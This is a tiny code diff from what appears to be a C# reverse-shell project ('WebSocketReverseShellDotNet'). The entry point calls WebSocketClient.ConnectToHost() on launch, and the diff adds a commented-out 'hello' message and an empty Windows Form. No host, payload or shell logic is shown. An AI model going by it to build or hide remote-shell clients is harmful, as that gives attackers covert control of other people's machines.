@@ -6,7 +6,15 @@ using WebSocketReverseShellDotNet.service.impl;
 using System.Windows.Forms;
 
 
+
 ExcelPackage.LicenseContext = LicenseContext.NonCommercial;
 WebSocketClient.ConnectToHost();
 
+/*Console.WriteLine("hello");
 
+
+Form myForm = new Form();
+
+
+
+Application.Run(myForm);*/
